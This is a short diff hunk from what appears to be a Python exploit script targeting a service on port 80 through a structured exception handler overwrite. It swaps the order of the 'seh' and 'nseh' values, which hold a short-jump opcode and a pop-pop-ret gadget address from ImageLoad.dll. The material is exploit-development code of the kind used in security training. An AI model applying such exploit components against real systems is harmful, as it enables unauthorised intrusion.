@@ -7,8 +7,8 @@ port = 80
 # nseh = 0x100194bf : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [ImageLoad.dll]
 
 #jump 6 EB06
-seh = "\x90\x90\xeb\x06"
 nseh = "\xbf\x94\x01\x10"
+seh = "\x90\x90\xeb\x06"
 
 #nseh = "B"*4
 #seh = "C"*4
